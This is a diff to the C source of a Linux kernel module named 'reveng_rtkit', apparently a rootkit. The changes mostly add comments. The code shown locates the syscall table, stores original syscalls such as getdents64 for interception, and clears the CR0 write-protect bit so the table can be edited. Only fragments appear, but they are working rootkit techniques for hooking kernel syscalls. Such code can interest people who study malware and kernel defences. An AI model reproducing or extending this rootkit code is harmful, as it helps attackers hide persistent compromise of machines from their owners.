@@ -4,6 +4,8 @@
 #include <linux/fdtable.h>      /* Open file table structure: files_struct structure */
 #include <linux/proc_ns.h>	
 
+#include <asm/ptrace.h>		/* For intercepting syscall, struct named pt_regs is needed */
+
 
 #ifndef __NR_getdents
 #define __NR_getdents 141
@@ -38,7 +40,7 @@ unsigned long cr0;
 // To store the address of the found sys_call_table
 static unsigned long *__sys_call_table;
 
-// Defining a function to store original syscalls
+// Defining a custom function type to store original syscalls
 typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
 
 static tt_syscall orig_getdents64;
@@ -77,7 +79,7 @@ unsigned long *get_syscall_table(void)
 {
 	unsigned long *syscall_table;
 
-	// Defining custom kallsyms_lookup_name function, so that kallsyms_lookup_name be exported to kernel (>5.7)
+	//Defining custom kallsyms_lookup_name function type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
 	
 	/* // Lookup the address for a symbol. Returns 0 if not found.
 	 * unsigned long kallsyms_lookup_name(const char *name);
@@ -317,12 +319,12 @@ static inline void write_cr0_forced(unsigned long val)
 static inline void protect_memory(void)
 {
 	printk(KERN_INFO "[*] reveng_rtkit: (Memory protected): Regainig normal memory protection\n");
-	write_cr0_forced(cr0);
+	write_cr0_forced(cr0);	// Setting WP flag to 1 => read-only
 }
 
 static inline void unprotect_memory(void)
 {
-	pr_info("[*] reveng_rtkit: (Memory unprotected): Editing Syscall Table");
-	write_cr0_forced(cr0 & ~0x00010000);
+	pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
+	write_cr0_forced(cr0 & ~0x00010000);	// Setting WP flag to 0 => writable
 }
 
